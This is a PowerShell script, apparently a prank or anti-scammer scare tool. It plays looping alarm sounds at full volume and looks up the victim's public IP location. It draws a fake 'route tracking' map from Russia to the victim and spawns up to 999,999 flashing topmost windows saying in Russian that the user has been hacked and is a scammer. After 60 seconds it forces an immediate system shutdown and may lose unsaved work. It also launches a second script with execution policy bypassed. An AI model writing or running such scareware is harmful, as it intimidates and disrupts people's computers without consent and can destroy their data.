param(
    [ValidateRange(1, 999999)]
    [int]$WindowCount = 999999,
    [string]$WindowMessage = "Тебя взломали, уже поздно, ты — скамер.",
    [string]$WindowTitle = "Тебя взломали, уже поздно, ты — скамер."
)

$ErrorActionPreference = "Stop"

$lautScriptPath = Join-Path $PSScriptRoot "laut.ps1"
if (-not (Test-Path -LiteralPath $lautScriptPath)) {
    throw "Datei nicht gefunden: $lautScriptPath"
}
$currentExecutable = (Get-Process -Id $PID).Path
if ([string]::IsNullOrWhiteSpace($currentExecutable)) {
    $currentExecutable = Join-Path $PSHOME "pwsh.exe"
}
Start-Process -FilePath $currentExecutable -ArgumentList @(
    "-NoProfile",
    "-ExecutionPolicy",
    "Bypass",
    "-File",
    ('"{0}"' -f $lautScriptPath)
) | Out-Null

$files = @(
    (Join-Path $PSScriptRoot "TTSOL-ru-RU-Dmitry-20260911-211138.mp3"),
    (Join-Path $PSScriptRoot "matthewvakaliuk73627-mayotte-eas-alarm-298725.mp3"),
    (Join-Path $PSScriptRoot "freesound_community-red-alert_nuclear_buzzer-99741.mp3")
)

foreach ($file in $files) {
    if (-not (Test-Path -LiteralPath $file)) {
        throw "Файл не найден: $file"
    }
}

$players = @()
$windows = @()
Add-Type -AssemblyName PresentationCore
Add-Type -AssemblyName PresentationFramework
Add-Type -AssemblyName WindowsBase
if (-not ('NativeWindowOrder' -as [type])) {
    Add-Type @"
using System;
using System.Runtime.InteropServices;
public static class NativeWindowOrder {
    public static readonly IntPtr HWND_TOPMOST = new IntPtr(-1);
    public const uint SWP_NOSIZE = 0x0001;
    public const uint SWP_NOMOVE = 0x0002;
    public const uint SWP_NOACTIVATE = 0x0010;
    [DllImport("user32.dll", SetLastError = true)]
    public static extern bool SetWindowPos(IntPtr hWnd, IntPtr hWndInsertAfter, int X, int Y, int cx, int cy, uint uFlags);
}
"@
}
$dispatcher = [System.Windows.Threading.Dispatcher]::CurrentDispatcher
if ($dispatcher.HasShutdownStarted -or $dispatcher.HasShutdownFinished) {
    $currentExecutable = (Get-Process -Id $PID).Path
    if ([string]::IsNullOrWhiteSpace($currentExecutable)) {
        $currentExecutable = Join-Path $PSHOME "pwsh.exe"
    }
    $scriptArgument = '"{0}"' -f $PSCommandPath
    Start-Process -FilePath $currentExecutable -ArgumentList @(
        "-NoProfile",
        "-ExecutionPolicy",
        "Bypass",
        "-File",
        $scriptArgument
    ) | Out-Null
    exit
}

foreach ($file in $files) {
    $player = New-Object System.Windows.Media.MediaPlayer
    $player.Volume = 1.0
    $player.add_MediaOpened({
        param($sender, $eventArgs)
        $sender.Play()
    })
    $player.add_MediaEnded({
        param($sender, $eventArgs)
        $sender.Position = [TimeSpan]::Zero
        $sender.Play()
    })
    $player.Open([Uri]::new($file))
    $players += $player
}

function ConvertTo-MapPoint {
    param(
        [double]$Lat,
        [double]$Lon,
        [double]$Width,
        [double]$Height
    )
    [pscustomobject]@{
        X = (($Lon + 180.0) / 360.0) * $Width
        Y = ((90.0 - $Lat) / 180.0) * $Height
    }
}

function Get-PublicIpGeo {
    try {
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        $response = Invoke-RestMethod -Uri "http://ip-api.com/json/?fields=status,country,countryCode,lat,lon,query,city" -TimeoutSec 8
        if ($response.status -ne "success") {
            return $null
        }
        return $response
    } catch {
        return $null
    }
}

function Get-WorldMapImage {
    $mapPath = Join-Path $env:TEMP "bloody-scammer-worldmap.jpg"
    if (-not (Test-Path -LiteralPath $mapPath)) {
        try {
            Invoke-WebRequest -Uri "https://upload.wikimedia.org/wikipedia/commons/thumb/8/83/Equirectangular_projection_SW.jpg/1280px-Equirectangular_projection_SW.jpg" -OutFile $mapPath -TimeoutSec 20
        } catch {
            return $null
        }
    }
    try {
        $bitmap = New-Object System.Windows.Media.Imaging.BitmapImage
        $bitmap.BeginInit()
        $bitmap.CacheOption = [System.Windows.Media.Imaging.BitmapCacheOption]::OnLoad
        $bitmap.UriSource = [Uri]::new($mapPath)
        $bitmap.EndInit()
        $bitmap.Freeze()
        return $bitmap
    } catch {
        return $null
    }
}

function Add-MapMarker {
    param(
        $Canvas,
        [double]$X,
        [double]$Y,
        [double]$Size,
        $Fill,
        $Stroke
    )
    $dot = New-Object System.Windows.Shapes.Ellipse
    $dot.Width = $Size
    $dot.Height = $Size
    $dot.Fill = $Fill
    $dot.Stroke = $Stroke
    $dot.StrokeThickness = 2
    [System.Windows.Controls.Canvas]::SetLeft($dot, $X - ($Size / 2))
    [System.Windows.Controls.Canvas]::SetTop($dot, $Y - ($Size / 2))
    $Canvas.Children.Add($dot) | Out-Null
    return $dot
}

function Add-MapLabel {
    param(
        $Canvas,
        [string]$Text,
        [double]$X,
        [double]$Y,
        $Foreground
    )
    $label = New-Object System.Windows.Controls.TextBlock
    $label.Text = $Text
    $label.Foreground = $Foreground
    $label.FontSize = 13
    $label.FontWeight = "Bold"
    $label.Effect = New-Object System.Windows.Media.Effects.DropShadowEffect
    $label.Effect.BlurRadius = 6
    $label.Effect.ShadowDepth = 0
    $label.Effect.Color = [System.Windows.Media.Colors]::Black
    $Canvas.Children.Add($label) | Out-Null
    $label.Measure((New-Object System.Windows.Size([double]::PositiveInfinity, [double]::PositiveInfinity)))
    [System.Windows.Controls.Canvas]::SetLeft($label, [Math]::Max(8, [Math]::Min($X + 12, $Canvas.Width - $label.DesiredSize.Width - 8)))
    [System.Windows.Controls.Canvas]::SetTop($label, [Math]::Max(8, $Y - 28))
}

function New-RouteMapWindow {
    param(
        [double]$ScreenLeft,
        [double]$ScreenTop,
        [double]$ScreenWidth,
        [double]$ScreenHeight
    )

    $windowWidthLocal = [Math]::Min(920.0, [Math]::Max(680.0, $ScreenWidth * 0.50))
    $windowHeightLocal = [Math]::Min(580.0, [Math]::Max(430.0, $ScreenHeight * 0.52))
    $mapWidth = [Math]::Max(560.0, $windowWidthLocal - 60.0)
    $mapHeight = [Math]::Max(280.0, $windowHeightLocal - 168.0)
    $russiaLat = 55.7558
    $russiaLon = 37.6173
    $geo = Get-PublicIpGeo
    $mapImage = Get-WorldMapImage

    $window = New-Object System.Windows.Window
    $window.Title = "ОТСЛЕЖИВАНИЕ МАРШРУТА"
    $window.Width = $windowWidthLocal
    $window.Height = $windowHeightLocal
    $window.WindowStartupLocation = "Manual"
    $window.ResizeMode = "NoResize"
    $window.Topmost = $true
    $window.ShowActivated = $true
    $window.Background = [System.Windows.Media.Brushes]::Transparent
    $window.Left = $ScreenLeft + (($ScreenWidth - $windowWidthLocal) / 2)
    $window.Top = $ScreenTop + (($ScreenHeight - $windowHeightLocal) / 2)
    $window.Add_PreviewKeyDown({
        param($sender, $eventArgs)
        if ($eventArgs.Key -eq [System.Windows.Input.Key]::Escape) {
            [System.Windows.Threading.Dispatcher]::ExitAllFrames()
        }
    })

    $card = New-Object System.Windows.Controls.Border
    $card.Background = New-Object System.Windows.Media.SolidColorBrush([System.Windows.Media.Color]::FromRgb(20, 24, 32))
    $card.BorderBrush = New-Object System.Windows.Media.SolidColorBrush([System.Windows.Media.Color]::FromRgb(255, 76, 100))
    $card.BorderThickness = New-Object System.Windows.Thickness(2)
    $card.CornerRadius = New-Object System.Windows.CornerRadius(16)
    $card.Padding = New-Object System.Windows.Thickness(22)
    $card.Margin = New-Object System.Windows.Thickness(10)

    $layout = New-Object System.Windows.Controls.StackPanel

    $badge = New-Object System.Windows.Controls.TextBlock
    $badge.Text = "  ОТСЛЕЖИВАНИЕ В РЕАЛЬНОМ ВРЕМЕНИ  "
    $badge.Foreground = New-Object System.Windows.Media.SolidColorBrush([System.Windows.Media.Color]::FromRgb(255, 115, 132))
    $badge.FontSize = 12
    $badge.FontWeight = "Bold"
    $layout.Children.Add($badge) | Out-Null

    $title = New-Object System.Windows.Controls.TextBlock
    $title.Text = "Россия  →  цель по IP"
    $title.Foreground = [System.Windows.Media.Brushes]::White
    $title.FontSize = 26
    $title.FontWeight = "SemiBold"
    $title.Margin = New-Object System.Windows.Thickness(0, 6, 0, 4)
    $layout.Children.Add($title) | Out-Null

    $subtitle = New-Object System.Windows.Controls.TextBlock
    $subtitle.Foreground = New-Object System.Windows.Media.SolidColorBrush([System.Windows.Media.Color]::FromRgb(190, 198, 210))
    $subtitle.FontSize = 15
    $subtitle.TextWrapping = "Wrap"
    $subtitle.Margin = New-Object System.Windows.Thickness(0, 0, 0, 14)
    if ($geo) {
        $subtitle.Text = ("Источник: Россия (Москва)   Цель: удалённый узел   IP: {0}" -f $geo.query)
    } else {
        $subtitle.Text = "Не удалось определить местоположение по IP."
    }
    $layout.Children.Add($subtitle) | Out-Null

    $mapFrame = New-Object System.Windows.Controls.Border
    $mapFrame.CornerRadius = New-Object System.Windows.CornerRadius(12)
    $mapFrame.BorderThickness = New-Object System.Windows.Thickness(1)
    $mapFrame.BorderBrush = New-Object System.Windows.Media.SolidColorBrush([System.Windows.Media.Color]::FromRgb(80, 90, 110))
    $mapFrame.ClipToBounds = $true

    $canvas = New-Object System.Windows.Controls.Canvas
    $canvas.Width = $mapWidth
    $canvas.Height = $mapHeight
    $canvas.Background = New-Object System.Windows.Media.SolidColorBrush([System.Windows.Media.Color]::FromRgb(8, 16, 32))

    if ($mapImage) {
        $image = New-Object System.Windows.Controls.Image
        $image.Source = $mapImage
        $image.Width = $mapWidth
        $image.Height = $mapHeight
        $image.Stretch = "Fill"
        $image.Opacity = 0.55
        $canvas.Children.Add($image) | Out-Null

        $dim = New-Object System.Windows.Shapes.Rectangle
        $dim.Width = $mapWidth
        $dim.Height = $mapHeight
        $dim.Fill = New-Object System.Windows.Media.SolidColorBrush([System.Windows.Media.Color]::FromRgb(10, 16, 28))
        $dim.Opacity = 0.28
        $canvas.Children.Add($dim) | Out-Null
    }

    $from = ConvertTo-MapPoint -Lat $russiaLat -Lon $russiaLon -Width $mapWidth -Height $mapHeight
    $red = New-Object System.Windows.Media.SolidColorBrush([System.Windows.Media.Color]::FromRgb(255, 70, 80))
    $white = [System.Windows.Media.Brushes]::White

    if ($geo) {
        $to = ConvertTo-MapPoint -Lat ([double]$geo.lat) -Lon ([double]$geo.lon) -Width $mapWidth -Height $mapHeight
        $dx = $to.X - $from.X
        $dy = $to.Y - $from.Y
        $controlX = (($from.X + $to.X) / 2) - ($dy * 0.18)
        $controlY = (($from.Y + $to.Y) / 2) + ($dx * 0.18)
        $controlX = [Math]::Max(24, [Math]::Min($mapWidth - 24, $controlX))
        $controlY = [Math]::Max(24, [Math]::Min($mapHeight - 24, $controlY))

        $route = New-Object System.Windows.Shapes.Path
        $route.Stroke = $red
        $route.StrokeThickness = 3.5
        $route.StrokeStartLineCap = "Round"
        $route.StrokeEndLineCap = "Round"
        $figure = New-Object System.Windows.Media.PathFigure
        $figure.StartPoint = New-Object System.Windows.Point($from.X, $from.Y)
        $bezier = New-Object System.Windows.Media.QuadraticBezierSegment
        $bezier.Point1 = New-Object System.Windows.Point($controlX, $controlY)
        $bezier.Point2 = New-Object System.Windows.Point($to.X, $to.Y)
        $figure.Segments.Add($bezier) | Out-Null
        $geometry = New-Object System.Windows.Media.PathGeometry
        $geometry.Figures.Add($figure) | Out-Null
        $route.Data = $geometry
        $canvas.Children.Add($route) | Out-Null

        $angle = [Math]::Atan2($to.Y - $controlY, $to.X - $controlX)
        $head = 18.0
        $wing = 8.0
        $arrow = New-Object System.Windows.Shapes.Polygon
        $arrow.Fill = $red
        $arrow.Points = New-Object System.Windows.Media.PointCollection
        $arrow.Points.Add((New-Object System.Windows.Point($to.X, $to.Y))) | Out-Null
        $arrow.Points.Add((New-Object System.Windows.Point(($to.X - ($head * [Math]::Cos($angle)) + ($wing * [Math]::Sin($angle))), ($to.Y - ($head * [Math]::Sin($angle)) - ($wing * [Math]::Cos($angle)))))) | Out-Null
        $arrow.Points.Add((New-Object System.Windows.Point(($to.X - ($head * [Math]::Cos($angle)) - ($wing * [Math]::Sin($angle))), ($to.Y - ($head * [Math]::Sin($angle)) + ($wing * [Math]::Cos($angle)))))) | Out-Null
        $canvas.Children.Add($arrow) | Out-Null

        Add-MapMarker -Canvas $canvas -X $to.X -Y $to.Y -Size 14 -Fill $red -Stroke $white | Out-Null
        Add-MapLabel -Canvas $canvas -Text "Цель" -X $to.X -Y $to.Y -Foreground $white
    }

    Add-MapMarker -Canvas $canvas -X $from.X -Y $from.Y -Size 16 -Fill $white -Stroke $red | Out-Null
    Add-MapLabel -Canvas $canvas -Text "Россия" -X $from.X -Y $from.Y -Foreground $white

    $mapFrame.Child = $canvas
    $layout.Children.Add($mapFrame) | Out-Null
    $card.Child = $layout
    $window.Content = $card
    $window.Show()
    return $window
}

function Get-MapWindowRect {
    $width = [Math]::Max($script:mapWindow.ActualWidth, $script:mapWindow.Width)
    $height = [Math]::Max($script:mapWindow.ActualHeight, $script:mapWindow.Height)
    [pscustomobject]@{
        Left = $script:mapWindow.Left
        Top = $script:mapWindow.Top
        Right = $script:mapWindow.Left + $width
        Bottom = $script:mapWindow.Top + $height
    }
}

function Get-RectOverlapRatio {
    param($Left, $Top, $Right, $Bottom, $Other)
    $overlapLeft = [Math]::Max($Left, $Other.Left)
    $overlapTop = [Math]::Max($Top, $Other.Top)
    $overlapRight = [Math]::Min($Right, $Other.Right)
    $overlapBottom = [Math]::Min($Bottom, $Other.Bottom)
    $overlapW = [Math]::Max(0.0, $overlapRight - $overlapLeft)
    $overlapH = [Math]::Max(0.0, $overlapBottom - $overlapTop)
    $area = [Math]::Max(1.0, ($Right - $Left) * ($Bottom - $Top))
    return (($overlapW * $overlapH) / $area)
}

function Keep-MapWindowInFront {
    if (-not $script:mapWindow) {
        return
    }
    $script:mapWindow.Topmost = $true
    $mapHwnd = (New-Object System.Windows.Interop.WindowInteropHelper($script:mapWindow)).EnsureHandle()
    $flags = [NativeWindowOrder]::SWP_NOSIZE -bor [NativeWindowOrder]::SWP_NOMOVE -bor [NativeWindowOrder]::SWP_NOACTIVATE
    [NativeWindowOrder]::SetWindowPos($mapHwnd, [NativeWindowOrder]::HWND_TOPMOST, 0, 0, 0, 0, $flags) | Out-Null
}

function Place-AlertBehindMap {
    param($Window)
    if (-not $script:mapWindow) {
        return
    }
    $mapHwnd = (New-Object System.Windows.Interop.WindowInteropHelper($script:mapWindow)).EnsureHandle()
    $windowHwnd = (New-Object System.Windows.Interop.WindowInteropHelper($Window)).EnsureHandle()
    $flags = [NativeWindowOrder]::SWP_NOSIZE -bor [NativeWindowOrder]::SWP_NOMOVE -bor [NativeWindowOrder]::SWP_NOACTIVATE
    [NativeWindowOrder]::SetWindowPos($windowHwnd, $mapHwnd, 0, 0, 0, 0, $flags) | Out-Null
    Keep-MapWindowInFront
}

function Repair-AlertPosition {
    param([double]$Left, [double]$Top)
    $minLeft = $script:screenLeft
    $minTop = $script:screenTop
    $maxLeft = $script:screenLeft + $script:screenWidth - $script:windowWidth
    $maxTop = $script:screenTop + $script:screenHeight - $script:windowHeight
    if ($maxLeft -lt $minLeft) { $maxLeft = $minLeft }
    if ($maxTop -lt $minTop) { $maxTop = $minTop }

    $mapRect = Get-MapWindowRect
    $right = $Left + $script:windowWidth
    $bottom = $Top + $script:windowHeight
    $hidden = Get-RectOverlapRatio -Left $Left -Top $Top -Right $right -Bottom $bottom -Other $mapRect
    if ($hidden -le 0.38) {
        return [pscustomobject]@{
            Left = [Math]::Min($maxLeft, [Math]::Max($minLeft, $Left))
            Top = [Math]::Min($maxTop, [Math]::Max($minTop, $Top))
        }
    }

    $toLeft = $mapRect.Left - $script:windowWidth + ($script:windowWidth * 0.34)
    $toRight = $mapRect.Right - ($script:windowWidth * 0.34)
    $toTop = $mapRect.Top - $script:windowHeight + ($script:windowHeight * 0.34)
    $toBottom = $mapRect.Bottom - ($script:windowHeight * 0.34)
    $centerX = ($Left + $right) / 2.0
    $centerY = ($Top + $bottom) / 2.0
    $mapCenterX = ($mapRect.Left + $mapRect.Right) / 2.0
    $mapCenterY = ($mapRect.Top + $mapRect.Bottom) / 2.0
    $dx = $centerX - $mapCenterX
    $dy = $centerY - $mapCenterY

    if ([Math]::Abs($dx) -ge [Math]::Abs($dy)) {
        if ($dx -lt 0) { $Left = $toLeft } else { $Left = $toRight }
    } else {
        if ($dy -lt 0) { $Top = $toTop } else { $Top = $toBottom }
    }

    [pscustomobject]@{
        Left = [Math]::Min($maxLeft, [Math]::Max($minLeft, $Left))
        Top = [Math]::Min($maxTop, [Math]::Max($minTop, $Top))
    }
}

function Get-AlertWindowPosition {
    param(
        [int]$Index,
        [switch]$Scatter
    )
    $spanX = [Math]::Max(1.0, $script:screenWidth - $script:windowWidth)
    $spanY = [Math]::Max(1.0, $script:screenHeight - $script:windowHeight)
    $stepX = [Math]::Max(64.0, $script:windowWidth * 0.22)
    $stepY = [Math]::Max(46.0, $script:windowHeight * 0.24)
    $left = $script:screenLeft + (($Index * $stepX) % $spanX)
    $row = [Math]::Floor(($Index * $stepX) / $spanX)
    $top = $script:screenTop + ((($row * $stepY) + (($Index % 7) * 11)) % $spanY)

    if ($Scatter) {
        $left += (($script:random.NextDouble() * 90.0) - 45.0)
        $top += (($script:random.NextDouble() * 70.0) - 35.0)
    }

    Repair-AlertPosition -Left $left -Top $top
}

$windowIndex = 0
$flashTargets = @()
$flashRed = $false
$script:screenLeft = [System.Windows.SystemParameters]::VirtualScreenLeft
$script:screenTop = [System.Windows.SystemParameters]::VirtualScreenTop
$script:screenWidth = [System.Windows.SystemParameters]::VirtualScreenWidth
$script:screenHeight = [System.Windows.SystemParameters]::VirtualScreenHeight
$script:windowWidth = 360
$script:windowHeight = 200
$script:random = New-Object System.Random
$script:mapWindow = New-RouteMapWindow -ScreenLeft $script:screenLeft -ScreenTop $script:screenTop -ScreenWidth $script:screenWidth -ScreenHeight $script:screenHeight
Keep-MapWindowInFront
$settleTimer = New-Object System.Windows.Threading.DispatcherTimer
$settleTimer.Interval = [TimeSpan]::FromMilliseconds(35)
$settleTimer.add_Tick({
    $allSettled = $true
    foreach ($windowNumber in 0..($script:windows.Count - 1)) {
        $target = Get-AlertWindowPosition -Index $windowNumber
        $targetLeft = $target.Left
        $targetTop = $target.Top
        $window = $script:windows[$windowNumber]
        $newLeft = $window.Left + (($targetLeft - $window.Left) * 0.16)
        $newTop = $window.Top + (($targetTop - $window.Top) * 0.16)
        if ([Math]::Abs($targetLeft - $newLeft) -gt 1 -or [Math]::Abs($targetTop - $newTop) -gt 1) {
            $allSettled = $false
        } else {
            $newLeft = $targetLeft
            $newTop = $targetTop
        }
        $window.Left = $newLeft
        $window.Top = $newTop
    }
    if ($allSettled) {
        $settleTimer.Stop()
        Keep-MapWindowInFront
    }
})
$windowTimer = New-Object System.Windows.Threading.DispatcherTimer
$windowTimer.Interval = [TimeSpan]::FromMilliseconds(1)
$windowTimer.add_Tick({
    if ($script:windowIndex -ge $WindowCount) {
        $windowTimer.Stop()
        return
    }

    $window = New-Object System.Windows.Window
    $window.Title = $WindowTitle
    $window.Width = $script:windowWidth
    $window.Height = $script:windowHeight
    $window.WindowStartupLocation = "Manual"
    $window.ResizeMode = "NoResize"
    $window.Topmost = $true
    $window.ShowActivated = $false
    $window.Background = [System.Windows.Media.Brushes]::Transparent
    $position = Get-AlertWindowPosition -Index $script:windowIndex -Scatter
    $window.Left = $position.Left
    $window.Top = $position.Top

    $card = New-Object System.Windows.Controls.Border
    $card.Background = New-Object System.Windows.Media.SolidColorBrush([System.Windows.Media.Color]::FromRgb(20, 24, 32))
    $card.BorderBrush = New-Object System.Windows.Media.SolidColorBrush([System.Windows.Media.Color]::FromRgb(255, 76, 100))
    $card.BorderThickness = New-Object System.Windows.Thickness(2)
    $card.CornerRadius = New-Object System.Windows.CornerRadius(14)
    $card.Padding = New-Object System.Windows.Thickness(22)

    $layout = New-Object System.Windows.Controls.Grid
    $layout.RowDefinitions.Add((New-Object System.Windows.Controls.RowDefinition))
    $layout.RowDefinitions.Add((New-Object System.Windows.Controls.RowDefinition))

    $badge = New-Object System.Windows.Controls.TextBlock
    $badge.Text = "  СИСТЕМНОЕ ПРЕДУПРЕЖДЕНИЕ  "
    $badge.Foreground = New-Object System.Windows.Media.SolidColorBrush([System.Windows.Media.Color]::FromRgb(255, 115, 132))
    $badge.FontSize = 11
    $badge.FontWeight = "Bold"
    $badge.HorizontalAlignment = "Left"
    [System.Windows.Controls.Grid]::SetRow($badge, 0)
    $layout.Children.Add($badge) | Out-Null

    $text = New-Object System.Windows.Controls.TextBlock
    $text.Text = $WindowMessage
    $text.Foreground = [System.Windows.Media.Brushes]::White
    $text.FontSize = 20
    $text.FontWeight = "SemiBold"
    $text.TextWrapping = "Wrap"
    $text.TextAlignment = "Center"
    $text.VerticalAlignment = "Center"
    $text.Margin = New-Object System.Windows.Thickness(0, 8, 0, 8)
    [System.Windows.Controls.Grid]::SetRow($text, 1)
    $layout.Children.Add($text) | Out-Null

    $card.Child = $layout
    $window.Content = $card
    $window.Show()
    Place-AlertBehindMap -Window $window
    $script:windows += $window
    $script:flashTargets += [pscustomobject]@{
        Card = $card
        Text = $text
        Badge = $badge
    }
    $script:windowIndex++
    Keep-MapWindowInFront
    if ($script:windowIndex -ge $WindowCount) {
        $windowTimer.Stop()
        $settleTimer.Start()
    }
})

$flashTimer = New-Object System.Windows.Threading.DispatcherTimer
$flashTimer.Interval = [TimeSpan]::FromMilliseconds(350)
$flashTimer.add_Tick({
    $script:flashRed = -not $script:flashRed
    if ($script:flashRed) {
        $cardColor = [System.Windows.Media.Color]::FromRgb(190, 0, 20)
        $textColor = [System.Windows.Media.Brushes]::White
    } else {
        $cardColor = [System.Windows.Media.Color]::FromRgb(0, 0, 0)
        $textColor = New-Object System.Windows.Media.SolidColorBrush([System.Windows.Media.Color]::FromRgb(255, 70, 70))
    }

    foreach ($target in $script:flashTargets) {
        $target.Card.Background = New-Object System.Windows.Media.SolidColorBrush($cardColor)
        $target.Card.BorderBrush = New-Object System.Windows.Media.SolidColorBrush($cardColor)
        $target.Text.Foreground = $textColor
        $target.Badge.Foreground = $textColor
    }
})

$zOrderTimer = New-Object System.Windows.Threading.DispatcherTimer
$zOrderTimer.Interval = [TimeSpan]::FromMilliseconds(50)
$zOrderTimer.add_Tick({
    Keep-MapWindowInFront
})

$exitTimer = New-Object System.Windows.Threading.DispatcherTimer
$exitTimer.Interval = [TimeSpan]::FromMilliseconds(100)
$exitTimer.add_Tick({
    if ([Console]::KeyAvailable) {
        $key = [Console]::ReadKey($true)
        if ($key.Key -eq [ConsoleKey]::Escape) {
            [System.Windows.Threading.Dispatcher]::ExitAllFrames()
        }
    }
})

$shutdownTimer = New-Object System.Windows.Threading.DispatcherTimer
$shutdownTimer.Interval = [TimeSpan]::FromSeconds(60)
$shutdownTimer.add_Tick({
    $shutdownTimer.Stop()
    Start-Process -FilePath "$env:SystemRoot\System32\shutdown.exe" -ArgumentList @('/s', '/t', '0')
})

try {
    Write-Host "Тебя взломали, уже поздно, ты — скамер."
    $windowTimer.Start()
    $flashTimer.Start()
    $zOrderTimer.Start()
    $exitTimer.Start()
    $shutdownTimer.Start()
    [System.Windows.Threading.Dispatcher]::Run()
}
finally {
    $windowTimer.Stop()
    $settleTimer.Stop()
    $flashTimer.Stop()
    $zOrderTimer.Stop()
    $exitTimer.Stop()
    $shutdownTimer.Stop()
    foreach ($window in $windows) {
        $window.Close()
    }
    if ($mapWindow) {
        $mapWindow.Close()
    }
    foreach ($player in $players) {
        $player.Stop()
        $player.Close()
    }
}
